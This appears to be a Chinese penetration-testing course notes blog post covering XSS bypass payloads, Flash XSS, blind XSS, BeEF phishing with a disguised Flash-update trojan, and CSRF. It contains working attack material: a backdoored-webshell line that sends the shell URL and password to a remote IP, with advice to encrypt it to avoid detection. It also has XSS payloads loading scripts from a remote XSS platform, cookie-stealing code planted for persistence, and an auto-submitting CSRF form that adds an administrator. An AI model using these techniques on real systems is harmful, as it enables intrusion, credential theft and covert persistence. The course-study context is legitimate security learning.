<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"lishang520.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="26、Flashxss&amp;mxss&amp;uxss&amp;FuzzBypass 1、mxss&amp;uxss&amp;flashxss 2、XSS代码层防护及绕过思路  防护的分类 代码层面 限制输入长度     可以通过修改length的数值来绕过   关键字过滤 换其它关键字、使用标签绕过   将尖括号实体化 使用事件     用户的设置 waf防护">
<meta property="og:type" content="article">
<meta property="og:title" content="26-30、渗透测试(xiaodi)">
<meta property="og:url" content="https://lishang520.github.io/2021/08/10/26-30%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/index.html">
<meta property="og:site_name" content="painter&#39;s Blog">
<meta property="og:description" content="26、Flashxss&amp;mxss&amp;uxss&amp;FuzzBypass 1、mxss&amp;uxss&amp;flashxss 2、XSS代码层防护及绕过思路  防护的分类 代码层面 限制输入长度     可以通过修改length的数值来绕过   关键字过滤 换其它关键字、使用标签绕过   将尖括号实体化 使用事件     用户的设置 waf防护">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://docimg3.docs.qq.com/image/he4hu1DXFKD8iZPI45bgsw?w=1024&h=686?type=image/gif">
<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210806130753815.png">
<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/3ce53a8a61da628bf2e3f6d60889a9a5/0?w=889&h=328">
<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/fa474aba6ed4a6d93fac52b4993fe7cd/0?w=440&h=527">
<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210807170941944.png">
<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210807170305564.png">
<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210807170355415.png">
<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210807170515806.png">
<meta property="article:published_time" content="2021-08-10T11:40:59.000Z">
<meta property="article:modified_time" content="2021-08-10T11:49:02.028Z">
<meta property="article:author" content="painter">
<meta property="article:tag" content="渗透测试">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://docimg3.docs.qq.com/image/he4hu1DXFKD8iZPI45bgsw?w=1024&h=686?type=image/gif">

<link rel="canonical" href="https://lishang520.github.io/2021/08/10/26-30%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>26-30、渗透测试(xiaodi) | painter's Blog</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?24a57553e96b4b8b803c9794fd76b400";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">painter's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-主页">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>

  </li>
        <li class="menu-item menu-item-关于我">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>

  </li>
        <li class="menu-item menu-item-标签">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-归档">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-友情链接">

    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>友情链接</a>

  </li>
        <li class="menu-item menu-item-guestbook">

    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/lishang520/" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lishang520.github.io/2021/08/10/26-30%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/%E5%A4%B4%E5%83%8F.jpg">
      <meta itemprop="name" content="painter">
      <meta itemprop="description" content="painter的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="painter's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          26-30、渗透测试(xiaodi)
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-10 19:40:59 / 修改时间：19:49:02" itemprop="dateCreated datePublished" datetime="2021-08-10T19:40:59+08:00">2021-08-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/08/10/26-30%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/10/26-30%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>12 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>26、Flashxss&amp;mxss&amp;uxss&amp;FuzzBypass</p>
<p>1、mxss&amp;uxss&amp;flashxss</p>
<p>2、XSS代码层防护及绕过思路</p>
<ul>
<li>防护的分类<ul>
<li>代码层面<ul>
<li>限制输入长度    <ul>
<li>可以通过修改length的数值来绕过</li>
</ul>
</li>
<li>关键字过滤<ul>
<li>换其它关键字、使用标签绕过</li>
</ul>
</li>
<li>将尖括号实体化<ul>
<li>使用事件</li>
</ul>
</li>
</ul>
</li>
<li>用户的设置</li>
<li>waf防护</li>
</ul>
</li>
</ul>
<span id="more"></span>

<p>3、XSS手工及项目检测bypass</p>
<p>#案例1-mxss&amp;uxss案例分析</p>
<ul>
<li>xss入门与介绍：<ul>
<li><a target="_blank" rel="noopener" href="https://www.fooying.com/the-art-of-xss-1-introduction/">https://www.fooying.com/the-art-of-xss-1-introduction/</a></li>
</ul>
</li>
<li>mxss<ul>
<li>特点：比较鸡肋，应用的场景少</li>
<li>定义：我们在一个地方拆入xss，但是被过滤了，导致无危害，但是如果我们将该文章分享到qq或者等其他地方，并且这些平台会对我们的分享的文章产生预览功能，这样的话可能会导致mxss</li>
<li>漏洞场景<ul>
<li>低版本的pc的qq以前存在mxss，新版本的qq只对比较大和信任的网站提供预览功能，比如新浪或者其他的，但是我们在新浪或者其他平台很少有发表信息的权限</li>
</ul>
</li>
</ul>
</li>
<li>uxss<ul>
<li>定义：<ul>
<li>利用的是浏览器或者浏览器插件本身的漏洞，这种漏洞只有很牛逼的大佬才能挖到，挖到一个可能就几万美元了</li>
</ul>
</li>
<li>uxss和普通xss的区别<ul>
<li>普通xss因为浏览器同源策略的原因，只能获取到某个网站的cookie，但是uxss是从浏览器本身出发，所以可以获取到该浏览器里的所有网站的cookie，甚至可以调用windows里的其它程序</li>
</ul>
</li>
<li>案例：搜狗浏览器uxss：只要通过搜狗浏览器访问一个网站，就能执行特定的程序，比如计算机<ul>
<li>​                 <img src="https://docimg3.docs.qq.com/image/he4hu1DXFKD8iZPI45bgsw?w=1024&h=686?type=image/gif" alt="img">        </li>
</ul>
</li>
</ul>
</li>
</ul>
<p>#案例2-flashxss案例分析实际利用</p>
<ul>
<li>```<br>谷歌搜索语法：filetype:swf inurl:xml意义：flash会加载一个远程的资源，而该资源的后缀就是xml，我们只需要将它加载的远程的xml换成我们自己构造的远程xml文件即可，同时在该xml文件里的开头的link处插入xss攻击代码攻击流程：    1、下载目标网站的xml，修改xml，将开头的link处修改为xss攻击代码    2、将修改后的xml放入自己的网站中    3、在xml的当前目录创建一个Crossdomain.xml   该文件的作用是给目标网站对我们修改的xml文件的访问权限，Crossdomain.xml的代码如下<?xml version="1.0"?><cross-domain-policy>    <allow-access-from domain="*.xxx.xxx" /></cross-domain-policy>    4、将目标网站的url里的xml链接替换为我们自己的服务器上的xml链接，然后访问即可<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">\</span><br><span class="line"></span><br><span class="line">#案例3-绕过代码层过滤分析bypass</span><br><span class="line"></span><br><span class="line">- 参考链接</span><br><span class="line"></span><br><span class="line">  - xss靶场：https://github.com/do0dl3/xss-labs</span><br><span class="line">  - xss小结：https://xz.aliyun.com/t/2936</span><br><span class="line"></span><br><span class="line">- 绕过方法</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">    &lt;script&gt;alert(1)&lt;/script&gt; 普通&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//  闭合&#x27; onclick=alert(1) // 闭合事件，这里的2个斜杠代表着注释#如果尖括号被过滤（实体化），可以尝试使用事件来触发&quot; onclick=alert(1) // 闭合事件#如果事件的关键字被过滤，可以尝试其他的事件，参考文章https://xz.aliyun.com/t/2936  这里面有很多其他的事件&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;aa&lt;/a&gt; // 闭合自定义&quot;&gt;&lt;sCript&gt;alert(1)&lt;/scRipt&gt; //html大小写</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>#案例4-项目自动探针&amp;手工Fuzz发包</p>
<ul>
<li><p>参考链接</p>
<ul>
<li><p>xss识别工具：<a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p>
<ul>
<li><p>特点：能fuzz，能识别waf，能绕过waf，xss专用工具</p>
</li>
<li><p>缺点：没有人工那么智能，有时候一些地方跑不出来</p>
</li>
<li><p>批量扫描：</p>
<ul>
<li>```python<br>python3 xsstrike.py –seeds urls.txt<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 手工fuzz</span><br><span class="line"></span><br><span class="line">    - 优点：能测出一些工具跑不出来的xss</span><br><span class="line">    - xss的fuzz字典：https://github.com/TheKingOfDuck/fuzzDicts</span><br><span class="line">    - 手工方法：</span><br><span class="line">      - 将payload的位置加变量，然后加载字典即可</span><br><span class="line"></span><br><span class="line">- 使用建议：</span><br><span class="line"></span><br><span class="line">  - 推荐工具+手工fuzz，就能跑出大部分的xss了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">技巧：怎么获取免费的在线靶场？</span><br><span class="line"></span><br><span class="line">- [靶场训练 (ikillyou.top)](https://bachang.ikillyou.top/)</span><br><span class="line"></span><br><span class="line">- 在fofa里搜索靶场的关键字，可以是靶场里的内容，也可以是靶场url里的关键字，比如我们这里使用的xsslabs</span><br><span class="line">  - ![image-20210805203504172](/source/images/image-20210805203504172.png)</span><br><span class="line">- 可以直接在fofa里搜索url里的关键字xsslabs，即可获取别人搭建的靶场</span><br><span class="line">  - ![image-20210805203646965](/source/images/image-20210805203646965.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 27、XSS红队盲打&amp;蓝队钓鱼直打&amp;权限维持</span><br><span class="line"></span><br><span class="line">关于红蓝队环境安装：https://github.com/ffffffff0x/f8x</span><br><span class="line"></span><br><span class="line">- 功能：支持一键安装红队和 蓝队的需要的环境</span><br><span class="line">- ![image-20210806133210501](/source/images/image-20210806133210501.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xss直打和盲打</span><br><span class="line"></span><br><span class="line">- 直打：可以看的见返回的数据，比如xss成功或者失败，我们可以根据显示结果，再来尝试绕过</span><br><span class="line"></span><br><span class="line">  - 留言板</span><br><span class="line">  - 评论</span><br><span class="line">  - </span><br><span class="line"></span><br><span class="line">- 盲打：xss打过去，不知道会不会成功，没有返回的结果显示，所以没有绕过这一说法</span><br><span class="line"></span><br><span class="line">  - 与客服的聊天窗口</span><br><span class="line"></span><br><span class="line">  - 意见反馈（我们用户看不到并且只有官方才能看的到的那种）</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">#案例1-红队盲打-目标webshell箱子反杀记webshell大全：https://github.com/tennc/webshell#情节：网上有的作者很坏，免费分享各种webshell，但是这种webshell里却带有后门，当我们使用他的webshell拿下权限并且登录后，对方的webshell会将我们获取的webshell地址和密码发送给作者，所以我们相当于给别人打工了收信：http://47.94.236.117/admin/login.asp      #这个是作者用来储存它的带后门的webshell发送过来的网站#小白中招流程与反制	1、喜滋滋的得到了“好心人”发布的牛逼的webshell    2、经过苦战，拿下网站的权限，下面是shell地址，和密码		被控：http://test.xiaodi8.com/1.php angel    3、小白开始登录shell，输入密码    4、GG，小白中招了，在小白登录webshell的一瞬间，该webshell向远程的一个地址发送了信息，信息的内容就是小白刚刚获取的webshell地址和密码    5、至此，小白相当于给那个“好心的作者”打工了，自己获取到的shell和密码，结果作者也白嫖到了    6、恰巧，小白的同事小迪经过，根据经验分析，觉得小白很可能中招了，小迪在小白的webshell页面打开审查元素界面，并且刷新，发现了一个异常请求		http://47.94.236.117/api.asp?url=http://test.xiaodi8.com/phpspy2010.php&amp;pass=angel&amp;id=1    7、该请求是将shell的地址和密码发送到一个ip为47.94.236.117 的地址，此时小白欲哭无泪，求助小迪，于是小迪开始教小白怎么反制作者    8、因为作者会接收后门返回的shell地址和密码，很有可能会被集体存储在一个页面，所以我们可以用 xss进行反制    9、在异常请求的密码处构造payload，插入xss代码，这样一旦作者登录后台查看今天的收成时，对方很有可能中招，我们由此可以获取到对方储存webshell的地址的账户和密码，由此收获一大批webshell，payload如下：（这里的xss代码可以从xss在线平台获取）    http://47.94.236.117/api.asp?url=http://www.xiaodi8.com/phpspy2010.php&lt;sCRiPt sRC=https://xss.pt/Wrjg&gt;&lt;/sCrIpT&gt;&amp;pass=angel&lt;sCRiPt sRC=https://xss.pt/Wrjg&gt;&lt;/sCrIpT&gt;&amp;id=1    10、到了下午，小白的xss明显被成功触发，因为他在它的xss平台获取到了一个地址和cookie，登录进去发现了大量的webshell    	</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#怎么制作带后门的webshell1、首先找到一个正常的webshell2、编辑webshell，因为正常的webshell都几乎会获取到shell地址和设置shell密码，这些都在webshell文件里有，所以我们只需要使用下面的语句插入进去，一个带后门的webshell就制作成功了echo &quot;&lt;script src=&#x27;http://47.94.236.117/api.asp?url=$url&amp;pass=$admin[&#x27;pass&#x27;]&#x27;&gt;&lt;/script&gt;&quot;;#这里的变量$url和$admin[&#x27;pass&#x27;]  都是webshell里的变量，当我们制作带后门的webshell时，需要根据实际情况修改#怎么防止别人发现webshell里的后门？只需要将后门代码进行加密即可</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="/source/images/image-20210806130753815.png" alt="image-20210806130753815"></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例2-蓝队直打-目标hook配合钓鱼反杀记蓝队a：	任务：保护网站test.xiaodi8.com 网站红队b：	任务：攻击test.xiaodi8.com 网站1、为了防止网站被红队攻击，蓝队a在test.xiaodi8.com的网站首页插入了beef的上线payload	https://github.com/beefproject/beef/wiki/Installation#docker-setup      #通过docker安装beef2、这样一旦有恶意攻击者访问该页面，就会中招，在蓝队的beef里上线，想到这里，蓝队觉得还不够，蓝队还想拿下红队b的攻击电脑的权限，于是蓝队a想通过flash钓鱼来攻击红队b，于是蓝队下载了项目Flash-Pop，Flash-Pop 是一个flash钓鱼的页面，只需要将其下载下来，解压放到网站即可。	https://github.com/r00tSe7en/Flash-Pop      #这是flash的钓鱼页面，只需要将其下载下来，解压放到网站即可3、为了配合flash钓鱼，蓝队a使用css生成了exe木马，为了falsh钓鱼的真实性，蓝队a对exe木马的图标和相关信息进行了修改	Restorator 资源文件加工，可以修改软件，比如exe文件的一些信息，图标等等，该软件在迪哥的资料包里有，第二课的资料包4、下午，红队b心情不好，决定开始攻击test.xiaodi8.com 网站，一访问，蓝队a那里就发现红队b在自己的beef里上线了，立马实行跳转的payload，跳转到：http://test.xiaodi8.com/flash/  而该页面，就是刚刚从项目Flash-Pop里下载下来的，该页面十分逼真，会提示更新flash，红队b看到后，想也不想的下载更新了，因为他心情不好，所以想快点升级完接着攻击网站test.xiaodi8.com5、下载到电脑，看到这个flash程序，红队b还是有警惕心理的，自己看了看flash的相关信息、图标，没发现什么问题，双击安装6、“哈哈，总算抓到红队了”，蓝队a大笑到，因为红队b刚刚运行了伪装成flash.exe的木马程序，蓝队a的css里已经看到一台主机上线了，通过css可以查看红队b的电脑文件、屏幕截图等等#升级玩法：	1、可以对木马程序进行免杀    2、可以对木马程序的版本信息、作者进行修改，让其和真正的flash程序保持一致，增加真实性    3、可以将木马程序和官方版本的flash文件进行捆绑，这样用户点击木马，真正的flash程序也会执行，这样更加的真实</span></span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例3-红队技能-利用Xss+Cookie权限维持Webshell箱子配合xss平台使用, 在红蓝对抗里面 ，红队经常要控制权限，其中web权限大部分都采用的shell控制， 但是shell会出现被删除，被拦截，被查杀等情况，漏洞也有可能被找到修复到，那么下一次控制的机会就基本没有了.所以我们利用一个小技巧，将盗取cookie的js代码植入到后台登录成功的文件中去，实现每个登录成功的操作都会将其cookie发送到平台，这样实现了长期的控制，并且这个代码不会被查杀 拦截 等情况 安全完美，条件：你获的的webshell权限之后的事情#举例子：127.0.0.1/login.php  这是登录的页面     127.0.0.1/index.php 这是登录成功的页面，所以我们的xss代码插在index.php文件里最好，因为这是登录成功才会发送cookie，如果插在login.php，登录失败也会发送cookie，而登陆失败的cookie我们肯定不需要，所以啊，我们拿到shell，为了维持权限，找到一个登录成功后的文件，插入xss代码，比如这里就是在index.php里插入</span></span><br></pre></td></tr></table></figure>





<h2 id="28、CSRF-amp-SSRF协议-amp-内网探针-amp-漏洞利用"><a href="#28、CSRF-amp-SSRF协议-amp-内网探针-amp-漏洞利用" class="headerlink" title="28、CSRF&amp;SSRF协议&amp;内网探针&amp;漏洞利用"></a>28、CSRF&amp;SSRF协议&amp;内网探针&amp;漏洞利用</h2><p>#案例1-CSRF-后台自动添加管理员</p>
<ul>
<li><p>原理：当我们发现一个目标站，接着的登录该目标站，管理员或者普通用户登录都可以，接着登录进去抓包分析里面的各种操作，比如转账、添加信息或者添加账户、删除等操作的数据包我们可以抓包看一下，然后观察这些数据包里有没有设置session，如果没有，那么就可以尝试构造csrf，构造后，如果被攻击者正在处于登录状态的浏览该网站，我们只需要将我们构建的csrff恶意页面发送给对方，对方如果打开了，那么对方就会触发csrf漏洞</p>
</li>
<li><p>防护手段：</p>
<ul>
<li>设置session</li>
<li>设置验证码</li>
<li>设置同源策略</li>
</ul>
</li>
<li><p>csrf在src挖掘中的应用</p>
<ul>
<li>当我们发现该网站的请求数据包里没有session的时候，可以尝试创建2个普通账户，然后进行csrf操作</li>
</ul>
</li>
<li><p>前提：</p>
<ul>
<li>被攻击者必须要在网站登录的状态下，比如后台</li>
<li>攻击者必须了解他攻击的网站的一些情况，比如添加管理员的数据包</li>
</ul>
</li>
<li><p>场景说明：见讲解</p>
<ul>
<li><p>我正在后台玩耍时，突然群内小伙子发给我一个网站，说上面有好东西，我打开了！</p>
</li>
<li><p>我正在浏览的网站，并且已经登录：<a target="_blank" rel="noopener" href="http://47.94.236.117/admin/index.asp">http://47.94.236.117/admin/index.asp</a></p>
</li>
<li><p>小伙子给我的网站（该网站有恶意代码）：<a target="_blank" rel="noopener" href="http://test.xiaodi8.com/add.html">http://test.xiaodi8.com/add.html</a></p>
<ul>
<li>```html<html>    <head lang="en">    <title>csrf_post</title>    <script>    window.onload = function() {    document.getElementById("postsubmit").click();  } </script></head><body>       <form action="http://47.94.236.117/admin/addadminuser.asp?action=add"  method="POST">            <input type="text" name="username" value="xiaodi"><br>            <input type="hidden" name="password" value="xiaodi"><br>            <input type="hidden" name="password1" value="xiaodi"><br>            <input id="postsubmit" type="submit" name="submit" value="submit" />       </form></body></html>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 